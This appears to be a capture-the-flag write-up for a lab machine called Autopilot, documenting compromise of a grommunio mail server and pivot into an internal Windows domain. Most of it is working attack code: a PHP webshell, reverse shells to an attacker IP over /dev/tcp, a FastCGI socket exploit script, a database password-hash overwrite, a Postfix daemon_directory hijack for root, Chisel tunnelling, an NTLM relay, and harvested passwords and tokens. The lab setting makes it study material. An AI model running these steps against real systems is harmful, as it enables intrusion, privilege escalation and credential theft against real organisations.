# Autopilot

<img width="1584" height="297" alt="image" src="https://github.com/user-attachments/assets/7087902f-fe06-45b4-88ec-4f447f446c30" />

---

## nmap scan

```ruby
─$ nmap -sCV -Pn 10.129.87.212
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-17 19:28 UTC
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 19:30 (0:00:00 remaining)
Nmap scan report for 10.129.87.212
Host is up (0.41s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx
| tls-alpn: 
|   h2
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=grommunio.autopilot.htb/organizationName=Autopilot/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:grommunio.autopilot.htb, DNS:autodiscover.autopilot.htb, DNS:mail.autopilot.htb
| Not valid before: 2026-07-15T16:20:23
|_Not valid after:  2101-06-27T16:20:23
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.26 seconds

```



## open web site on port `443` and login with credentials in machine bio:

```
deborah.hernandez / 8F5cgp@tC8g@
```

<img width="1919" height="801" alt="image" src="https://github.com/user-attachments/assets/ec2eafd7-dea7-476c-a3c0-21d5984f9e17" />

## digging into sittings found some plugins 

<img width="1919" height="581" alt="image" src="https://github.com/user-attachments/assets/20d80938-3606-445a-add9-d8226ee955c7" />

## in files plugin  add files account

<img width="1919" height="621" alt="image" src="https://github.com/user-attachments/assets/8e17cdb3-6960-47fe-9867-ad876ebc981f" />

## i will try to upload simple webshell 

```php
<?php system($_GET['cmd']); ?>
```

<img width="1919" height="448" alt="image" src="https://github.com/user-attachments/assets/76f2569f-b918-4786-b288-891154ff7dd1" />

## but where it's uploaded path i checked :

```
https://grommunio.autopilot.htb/files/index.php/apps/files/files
```

**`and found the path in settings`**

<img width="1916" height="580" alt="image" src="https://github.com/user-attachments/assets/958a3940-11b5-43fb-92e5-1306fdb79906" />

## now let's trigger it 

```
https://10.129.234.223/files/data/deborah.hernandez/files/shell.php?cmd=id
```

<img width="1245" height="219" alt="image" src="https://github.com/user-attachments/assets/ef6efe50-4d00-4cea-b434-082207321dc4" />

## bingo we got webshell

```
https://10.129.234.223/files/data/deborah.hernandez/files/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.34/4444%200%3E%261%22
```

<img width="1302" height="317" alt="image" src="https://github.com/user-attachments/assets/ef64b417-a044-41a2-a02d-e983b07e02b0" />

## i found in **`/var/lib/grommunio-files/config/config.php`**

```json
  'secret' => 'CJUmUrtinWFu/KX1v2kB06G3mYkHPGA7mNrChZVHey2Mdbrw',

  ....

  'dbuser' => 'grofiles',
  'dbpassword' => 'DvZPzO4k1uQCzL5D',
```

<img width="1579" height="349" alt="image" src="https://github.com/user-attachments/assets/69cbecb0-3159-441a-8bb0-ae2dca9f3d70" />

## found running process 

```
ss -tuln
```

<img width="1404" height="194" alt="image" src="https://github.com/user-attachments/assets/13d1e673-8f1f-45bc-8388-59053572f657" />


- **`3306`**: MySQL (Localhost only).
    
- **`6379`**: Redis (Localhost only).
    
- **`25`, `587`, `24`**: Postfix (SMTP / Mail Delivery).
    
- **`143`, `993`, `110`, `995`**: IMAP and POP3 (Gromox mail services).
    
- **`9000`**: PHP-FPM (The TCP alternative to the Unix socket ).
    
- **`33333`, `6666`, `5000`, `5555`**: Internal Gromox services (like the event service, timer, etc.).


## found in port **`8080`** grommunio Admin Web

<img width="1567" height="162" alt="image" src="https://github.com/user-attachments/assets/6fa7e01a-1854-4915-b5d1-9314bedb54bf" />


```
ps aux | grep -i admin
```

<img width="1286" height="75" alt="image" src="https://github.com/user-attachments/assets/c862bbb6-21d7-40d5-9bdd-afdd0c95c1e7" />

> Admin API is running as the grommunio user so to read it's configuration files we need to be **`gromox`** but how 

---

> #### After identifying the Admin API running as the `grommunio` system user, we attempted to read its configuration file (`/etc/gromox/mysql_adaptor.cfg`) but received a Permission Denied. We needed to execute code as a user with higher privileges.


<img width="980" height="162" alt="image" src="https://github.com/user-attachments/assets/e79aa5ed-e37f-41b5-8905-b8d93627350f" />


> #### I enumerated listening sockets using `ss -lnx` and discovered `/run/php-fpm/php-gromox-fpm.sock`. While we could not list the `/run/php-fpm/` directory (due to restrictive directory permissions), we knew the socket's exact path.


```
ss -lnx | grep php
```

<img width="1091" height="149" alt="image" src="https://github.com/user-attachments/assets/7860544c-8bb4-4237-8f53-e44366a5cee6" />

```
ls -la /run/php-fpm/
```

<img width="690" height="38" alt="image" src="https://github.com/user-attachments/assets/eebfff7e-c175-4844-8c9b-cb5bc52d140c" />


> #### The socket file `/run/php-fpm/php-gromox-fpm.sock` is the communication channel for the PHP-FPM pool named `gromox`. That pool is running as the `gromox` user.

## i will try to connect to it If we get a `Permission denied error` from the socket itself, it's not writable. If it connects, it is writable.

```
python3 -c "
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect('/run/php-fpm/php-gromox-fpm.sock')
    print('[+] Successfully connected to the socket! It is writable.')
except PermissionError:
    print('[-] Permission denied. The socket is NOT writable.')
except Exception as e:
    print(f'[?] Other error: {e}')
finally:
    s.close()
"
```

<img width="793" height="285" alt="image" src="https://github.com/user-attachments/assets/a907a373-a407-455f-8a1d-99db886e414c" />

## and it's writable 


<details>
  <summary>explain FastCGI Vulnerability</summary>


When a web server (like Nginx) receives a request for a `.php` file, it sends a **FastCGI request** to that socket.

- The FastCGI protocol has a parameter called `SCRIPT_FILENAME`.
    
- This parameter tells the FPM pool: _"Execute the PHP file located at this path."_
    

Normally, Nginx restricts which files can be executed. But if **you** can write to the socket directly (which we just proved we can), you can bypass Nginx. You can send a raw FastCGI request saying: _"Execute `/tmp/run.php`"_.

### Why does this equal `gromox` privileges?

When PHP-FPM executes a script, it executes it as the user configured for that pool.  
we proved the pool runs as `gromox`. Therefore, if we send a FastCGI request to that socket telling it to run your PHP script, **PHP will run your script as `gromox`.**

  
</details>

---


> #### We tested for write access by attempting to send a FastCGI payload directly to the socket. The successful execution of our command as `uid=475(gromox)` confirmed that the socket lacked proper access controls (such as `srw-rw----`), allowing an unprivileged user like `grofiles` to bypass the web server and hijack the `gromox` PHP pool.


## create file **`/tmp/run.php`**

```
printf '<?php echo shell_exec($_SERVER["HTTP_CMD"]); ?>' > /tmp/run.php
```

## create **`fcgi.py`**

```
cat > /tmp/fcgi.py << 'EOF'
import socket, sys, struct

def fcgi_request(sock_path, script_path, cmd):
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(sock_path)
    
    params = {
        'SCRIPT_FILENAME': script_path,
        'REQUEST_METHOD': 'GET',
        'HTTP_CMD': cmd,
        'SERVER_PROTOCOL': 'HTTP/1.1',
    }
    
    # Encode params correctly
    param_data = b''
    for k, v in params.items():
        k_b, v_b = k.encode(), v.encode()
        param_data += struct.pack('!B', len(k_b)) + struct.pack('!B', len(v_b)) + k_b + v_b
        
    # Send params
    sock.send(struct.pack('!BBHHBB', 1, 4, 1, len(param_data), 0, 0) + param_data)
    # Send end of params
    sock.send(struct.pack('!BBHHBB', 1, 4, 1, 0, 0, 0))
    # Send empty stdin record (FCGI_STDIN)
    sock.send(struct.pack('!BBHHBB', 1, 5, 1, 0, 0, 0))

    # Read response
    resp = b''
    while True:
        try:
            data = sock.recv(4096)
            if not data: break
            resp += data
        except socket.timeout:
            break
            
    # Parse out the actual HTTP body from FastCGI response
    body = b''
    offset = 0
    while offset < len(resp):
        version, type, req_id, content_len, padding_len, _ = struct.unpack('!BBHHBB', resp[offset:offset+8])
        offset += 8
        if type == 6: # FCGI_STDOUT
            body += resp[offset:offset+content_len]
        offset += content_len + padding_len
    
    print(body.decode(errors='ignore'))

fcgi_request(sys.argv[1], sys.argv[2], sys.argv[3])
EOF
```

## run the exploit 

```
python3 /tmp/fcgi.py /run/php-fpm/php-gromox-fpm.sock /tmp/run.php id
```


<img width="1025" height="148" alt="image" src="https://github.com/user-attachments/assets/b422ec67-3af6-4466-b2cc-67f969905be1" />


## goood now read MySQL configuration file `/etc/gromox/mysql_adaptor.cfg` 


```
python3 /tmp/fcgi.py /run/php-fpm/php-gromox-fpm.sock /tmp/run.php "cat /etc/gromox/mysql_adaptor.cfg"
```

<img width="1084" height="226" alt="image" src="https://github.com/user-attachments/assets/5e1efb10-6925-4a4d-ae6c-7c565aebaf71" />


```
mysql_username=grommunio
mysql_password=gDq6z9YVe4nyNRe5
mysql_dbname=grommunio
schema_upgrade=host:grommunio.autopilot.htb
```

---




<details>
  <summary>Source Code and Documentation Admin API</summary>



**1. The "Commit Hook" is a Whitelisted Command**  
The documentation for `grommunio-admin dbconf` explains that when you change a configuration, it can trigger a "commit hook" to restart the service . For security, only whitelisted commands are allowed.[](https://github.com/grommunio/admin-api/blob/master/doc/rst/grommunio-admin-dbconf.rst#1)

**2. The Whitelisted Command for Postfix uses `sudo`**  
In the source code file `admin-api/tools/dbconf.py`, the whitelisted command for committing a **file** change to Postfix is explicitly defined as:

```python

fileCommits = {"sudo postconf -e $FILE_S && systemctl reload postfix"}
```

_(Source: `admin-api/tools/dbconf.py`, line 11 on Codeberg )_[github_source_code](https://codeberg.org/grommunio/admin-api/src/commit/4ba72650e7b06d2dbf2de35b3bb8affbcb55fe20/tools/dbconf.py#1)[github_source_code](https://codeberg.org/grommunio/admin-api/raw/commit/4ba72650e7b06d2dbf2de35b3bb8affbcb55fe20/tools/dbconf.py#1)

The `sudo` prefix is the critical part. It means the `grommunio` user (which runs the API) is allowed to run this specific command **as root** via sudo.

**3. The API has an Endpoint to Trigger This**  
The official API documentation lists the endpoint to update a configuration file:  
`PATCH /system/dbconf/{service}/{file}/` .[Documentation](https://docs.grommunio.com/dev/api/)

So, when you send a PATCH request to update a Postfix configuration file via the API, the API runs the whitelisted command: `sudo postconf -e $FILE_S && systemctl reload postfix`.

### Why does this give us root?

The `sudo postconf` command writes the configuration changes to Postfix. By changing the `daemon_directory` setting, we are telling Postfix: "When you reload, look in this new directory for your `postfix-script`." When the API runs `systemctl reload postfix`, Postfix (which runs as root) executes the script from that directory as root.



  
</details>

---



1. **The Goal:** We want to run commands as `root`. The Admin API (running on port 8080) has the ability to modify system services like Postfix, which runs as `root`.
    
2. **The Problem:** We don't know the password for the `admin` user on the API.
    
3. **The Solution:** The Admin API checks the MySQL database (`grommunio`) to verify the password hash. Since we have the MySQL credentials, we can just **overwrite the admin's password hash in the database** with one we know.
    
4. **The Execution:** Once we change the hash, we log into the API with our new password, get a token, and use the API to make Postfix run a script as `root`.



---

## genrate new hash 

```
openssl passwd -6 'Password123!'
```

<img width="1022" height="144" alt="image" src="https://github.com/user-attachments/assets/320aed2e-0fab-43cc-9f81-9b1d78ced956" />

## Since we don't have a direct MySQL shell, we will use the FastCGI exploit to run the MySQL command as the gromox user.



```
mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio -e "UPDATE users SET password='\$6\$TRNhMg5wzcbcX1uZ\$lnqdsH07sC.QSXKU7ylsyOWaw0XGuzR1RsGcZHEh5dR9m4QaGfeOSBdeTHEWunjJgBJjtGGxNe2xObzF.TkeX.' WHERE username='admin';"
```







```
curl -s -X POST "http://127.0.0.1:8080/api/v1/login" -d "user=admin&pass=Password123!"
```


<img width="1601" height="171" alt="image" src="https://github.com/user-attachments/assets/b72a7165-47a4-4057-886b-4aac57b96e89" />

---

### The Final Exploit: Postfix Root Execution

Here is what we will do:

1. Create a malicious `postfix-script`.
    
2. Use the API to tell Postfix to look in our malicious directory.
    
3. Use the API to restart Postfix, which runs our script as `root`.


---

## Create the malicious scripts in `/var/lib/gromox/pwn`

```
mkdir -p /var/lib/gromox/pwn

# Create dummy master file
cat > /var/lib/gromox/pwn/master << 'EOF'
#!/bin/sh
exit 0
EOF
chmod +x /var/lib/gromox/pwn/master

# Create the reverse shell script
cat > /var/lib/gromox/pwn/postfix-script << 'EOF'
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/10.10.16.34/9000 0>&1'
exit 0
EOF
chmod +x /var/lib/gromox/pwn/postfix-script
```

## Tell the API to use the #POSTCONF trigger


```
python3 - << 'EOF'
import urllib.request
import json

TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c3IiOiJhZG1pbiIsImV4cCI6MTc5MzE3MTAxMH0.mYORoT3vMjl6QYLR73etljrdVpfGH_1ZjWrvOVmjbAjQbcZK8x_NOQ_N0X3Ve0IVIpPEwlRs99tvkT_z7K5dtoq0zMt0FMoewA9iVHEZuNjkAbfGg6uFtl_JlFeyREvpVtf0dZUjJ-VL_gt6t7CMu0nwfehWNDfIJEUG0E7Dd232gWejNyOup3cHl-MhPBd_yduEY3pzPIBVyZdJ-BZru-NCC_xiVT1HS3gd449jdzjsuaCUZO94KMLAMvkwgUQMfbgem7MfUdGIExY4ChPD43BNnQ2WS2h66xmCoENOibNDTvSJfylsZdo-62uKi8EgICXhDr3JGrRRZ_Ri533nT2LEDqXOfANdZ3Irm9ZjKo0UbgV73Hae-hGIOc4DIxYxcExX4fy7FBv5u80pk6H1TbzD3oE1L2C9Yz6mjG7NBk_3uoYuvo3kDzkzQl9iNelxUwZ99saHFD9V01C66FtUEgucNr-qyvrPXQKaUiNi9Lq2_Cc-Z0uAy-IwRz8vWiDtTzSfHCTpRfv61XCDGr-wXivQPNZBl34FIk3ckmnEjtYMlgX0oHs7gvHeguFq1NVWyBY_53iVjJU2qTkt0d19JVKycoGB5q9yco8To4q1YGz1rEtUrwiwB1uG1kLhz3dNbzRVydsLvKi2xSF60caBonpaxH3IxzZxVjHcLurfLVs"
CSRF = "9HKy+WwnRZyyi9+mHB8nrNRde3fvBiqAES5AgrFtM4s="

url = "http://127.0.0.1:8080/api/v1/system/dbconf/grommunio-dbconf/postfix/"
data = json.dumps({"data": {"commit_file": "#POSTCONF"}}).encode('utf-8')

req = urllib.request.Request(url, data=data, method='PATCH')
req.add_header('Content-Type', 'application/json')
req.add_header('Cookie', f'grommunioAuthJwt={TOKEN}')
req.add_header('x-csrf-token', CSRF)

try:
    with urllib.request.urlopen(req) as response:
        print(response.read().decode())
except Exception as e:
    print(f"Error: {e}")
EOF
```

<img width="864" height="145" alt="image" src="https://github.com/user-attachments/assets/42b09cd9-1af8-426b-918b-f1d2aa862315" />



## Change the Postfix daemon_directory to your malicious folder



```
python3 - << 'EOF'
import urllib.request
import json

TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c3IiOiJhZG1pbiIsImV4cCI6MTc5MzE3MTAxMH0.mYORoT3vMjl6QYLR73etljrdVpfGH_1ZjWrvOVmjbAjQbcZK8x_NOQ_N0X3Ve0IVIpPEwlRs99tvkT_z7K5dtoq0zMt0FMoewA9iVHEZuNjkAbfGg6uFtl_JlFeyREvpVtf0dZUjJ-VL_gt6t7CMu0nwfehWNDfIJEUG0E7Dd232gWejNyOup3cHl-MhPBd_yduEY3pzPIBVyZdJ-BZru-NCC_xiVT1HS3gd449jdzjsuaCUZO94KMLAMvkwgUQMfbgem7MfUdGIExY4ChPD43BNnQ2WS2h66xmCoENOibNDTvSJfylsZdo-62uKi8EgICXhDr3JGrRRZ_Ri533nT2LEDqXOfANdZ3Irm9ZjKo0UbgV73Hae-hGIOc4DIxYxcExX4fy7FBv5u80pk6H1TbzD3oE1L2C9Yz6mjG7NBk_3uoYuvo3kDzkzQl9iNelxUwZ99saHFD9V01C66FtUEgucNr-qyvrPXQKaUiNi9Lq2_Cc-Z0uAy-IwRz8vWiDtTzSfHCTpRfv61XCDGr-wXivQPNZBl34FIk3ckmnEjtYMlgX0oHs7gvHeguFq1NVWyBY_53iVjJU2qTkt0d19JVKycoGB5q9yco8To4q1YGz1rEtUrwiwB1uG1kLhz3dNbzRVydsLvKi2xSF60caBonpaxH3IxzZxVjHcLurfLVs"
CSRF = "9HKy+WwnRZyyi9+mHB8nrNRde3fvBiqAES5AgrFtM4s="

url = "http://127.0.0.1:8080/api/v1/system/dbconf/postfix/main/"
data = json.dumps({"data": {"daemon_directory": "/var/lib/gromox/pwn"}}).encode('utf-8')

req = urllib.request.Request(url, data=data, method='PATCH')
req.add_header('Content-Type', 'application/json')
req.add_header('Cookie', f'grommunioAuthJwt={TOKEN}')
req.add_header('x-csrf-token', CSRF)

try:
    with urllib.request.urlopen(req) as response:
        print(response.read().decode())
except Exception as e:
    print(f"Error: {e}")
EOF
```

<img width="923" height="224" alt="image" src="https://github.com/user-attachments/assets/523ed5bf-aef7-44b9-bcf3-640cf3236146" />


## Restart Postfix to trigger root execution


```
python3 - << 'EOF'
import urllib.request

TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c3IiOiJhZG1pbiIsImV4cCI6MTc5MzE3MTAxMH0.mYORoT3vMjl6QYLR73etljrdVpfGH_1ZjWrvOVmjbAjQbcZK8x_NOQ_N0X3Ve0IVIpPEwlRs99tvkT_z7K5dtoq0zMt0FMoewA9iVHEZuNjkAbfGg6uFtl_JlFeyREvpVtf0dZUjJ-VL_gt6t7CMu0nwfehWNDfIJEUG0E7Dd232gWejNyOup3cHl-MhPBd_yduEY3pzPIBVyZdJ-BZru-NCC_xiVT1HS3gd449jdzjsuaCUZO94KMLAMvkwgUQMfbgem7MfUdGIExY4ChPD43BNnQ2WS2h66xmCoENOibNDTvSJfylsZdo-62uKi8EgICXhDr3JGrRRZ_Ri533nT2LEDqXOfANdZ3Irm9ZjKo0UbgV73Hae-hGIOc4DIxYxcExX4fy7FBv5u80pk6H1TbzD3oE1L2C9Yz6mjG7NBk_3uoYuvo3kDzkzQl9iNelxUwZ99saHFD9V01C66FtUEgucNr-qyvrPXQKaUiNi9Lq2_Cc-Z0uAy-IwRz8vWiDtTzSfHCTpRfv61XCDGr-wXivQPNZBl34FIk3ckmnEjtYMlgX0oHs7gvHeguFq1NVWyBY_53iVjJU2qTkt0d19JVKycoGB5q9yco8To4q1YGz1rEtUrwiwB1uG1kLhz3dNbzRVydsLvKi2xSF60caBonpaxH3IxzZxVjHcLurfLVs"
CSRF = "9HKy+WwnRZyyi9+mHB8nrNRde3fvBiqAES5AgrFtM4s="

url = "http://127.0.0.1:8080/api/v1/system/dashboard/services/postfix.service/restart"
req = urllib.request.Request(url, data=b'', method='POST')
req.add_header('Cookie', f'grommunioAuthJwt={TOKEN}')
req.add_header('x-csrf-token', CSRF)

try:
    with urllib.request.urlopen(req) as response:
        print("Restart triggered:", response.read().decode())
except Exception as e:
    print(f"Error: {e}")
EOF
```

<img width="833" height="217" alt="image" src="https://github.com/user-attachments/assets/b0a4952c-a382-42ac-b697-c7c2109e7e9e" />

## we still need to pivote to internal windows server

---

## Phase 1: Linux Root to Internal Network Access

```
ip -br addr
ip route
```

```
lo               UNKNOWN        127.0.0.1/8 ::1/128 
eth0             UP             172.16.20.10/24 fe80::215:5dff:fe32:9101/64 
```



>  The Linux server has two interfaces. `eth0` is on the `172.16.20.0/24` network. Our Kali machine is on the `10.10.16.0/24` HTB VPN network and cannot reach `172.16.20.0/24` directly.


---

## Deploy a SOCKS Tunnel (Chisel)

**`on kali`**

```
./chisel_1.8.1_linux_amd64 server -p 8000 --reverse
```


## On Linux (Root): Download and run the Chisel client.

```
wget http://<KALI_IP>:8080/chisel_1.8.1_linux_amd64 -O /tmp/chisel
chmod +x /tmp/chisel
nohup /tmp/chisel client <KALI_IP>:8000 R:socks > /tmp/chisel.log 2>&1 &
```


> This creates a SOCKS5 proxy on `127.0.0.1:1080` on Kali, allowing us to route traffic through the Linux server into the internal network.

---

## Configure ProxyChains

Edit `/etc/proxychains4.conf` and add:

```
socks5 127.0.0.1 1080
```

## Enumerate the Internal Network

```
ip neigh
```

<img width="825" height="82" alt="image" src="https://github.com/user-attachments/assets/fa76d901-9e0c-45aa-ad38-2e0a083032ef" />


> The ARP cache reveals active hosts on the internal network. We discovered 172.16.20.15 (WS02) and 172.16.20.1 (Gateway).


---


## Phase 2: Capturing Credentials (NTLM Relay)

> WS02 connects to the mail server over IMAP. By intercepting this authentication, we can capture the NTLM hash of `stephanie.lewis` and relay it to WS02 itself to gain a shell.


## Step 1: Stop the Real IMAP Service

```
systemctl stop gromox-imap.service
```

> We need to free port 143 so our `socat` forwarder can listen on it.

---

## Forward IMAP Traffic to Kali


```
socat TCP-LISTEN:143,fork,reuseaddr TCP:<KALI_IP>:445
```

> This intercepts WS02's IMAP connection to port 143 on the Linux server and forwards it to port 445 (SMB) on our Kali machine, where ntlmrelayx is listening.

---

##  Start the NTLM Relay Attack

```
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://172.16.20.15 -smb2support -socks -socks-port 1081 -i
```

> This tool listens for SMB authentication on port 445. When it receives a connection, it relays it to smb://172.16.20.15. The -socks flag starts a SOCKS proxy on port 1081 for interactive sessions.

---

## Trigger Authentication

```
echo "Test" | mail -s "Test" stephanie.lewis@autopilot.htb
```

> Sending an email forces WS02's Thunderbird client to connect to the mail server (which is now our socat listener), triggering the NTLM authentication.

---

## Capture the Relay

```
[*] (SMB): Received connection from 172.16.20.15
[*] (SMB): Authenticating connection from AUTOPILOT/stephanie.lewis@...
[*] (SMB): Authenticating to smb://172.16.20.15 SUCCEED
```

> The NTLM hash was successfully relayed, granting us an interactive SMB session as stephanie.lewis.

---


## At the `ntlmrelayx>` prompt, type:

```text

socks
```

It will show you the active relay session:

```text

Protocol  Target          Username                 AdminStatus
SMB       172.16.20.15    AUTOPILOT/stephanie.lewis  TRUE
```


---
---
---
---
---
---
---


```
# 1. Look for LDAP / AD bind configs (grommunio uses these to sync with AD)
grep -ri "da-stephanie\|stephanie.lewis\|ldap_bind\|bindpw\|bind_pass" /etc/ 2>/dev/null


# 3. Postfix / sasl / dovecot auth files
cat /etc/postfix/*.cf | grep -i "user\|password"
cat /etc/dovecot/*.conf 2>/dev/null | grep -i "pass\|user"

# 4. Any deployment notes, scripts, or backups left on disk
grep -rl "da-stephanie" / 2>/dev/null
find / -iname "*ldap*" -o -iname "*ad*.conf" 2>/dev/null | head
```


<img width="1468" height="348" alt="image" src="https://github.com/user-attachments/assets/2a395b25-2785-4c92-839b-cd36d76c6539" />


### found


| Account     | DN                                                                  | Password                      | Source                                |
| ----------- | ------------------------------------------------------------------- | ----------------------------- | ------------------------------------- |
| `svc_ldap`  | `CN=svc_ldap,OU=Service_Accounts,OU=Resources,DC=autopilot,DC=htb`  | `Brother6-Let-Ship-Been-Take` | `/etc/gromox/ldap_adaptor.cfg`        |
| `svc_smime` | `CN=svc_smime,OU=Service_Accounts,OU=Resources,DC=autopilot,DC=htb` | `qzK3xTs02G11KSkhCewW`        | `/etc/grommunio-web/config-smime.php` |


---

```
proxychains4 -q nxc smb 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' -d AUTOPILOT --users --groups --shares

proxychains4 -q nxc smb 172.16.20.1 -u svc_smime -p 'qzK3xTs02G11KSkhCewW' -d AUTOPILOT --users --groups --shares
```


<img width="1559" height="139" alt="image" src="https://github.com/user-attachments/assets/a1cf9228-64b2-4446-b2a0-4f8351a88467" />























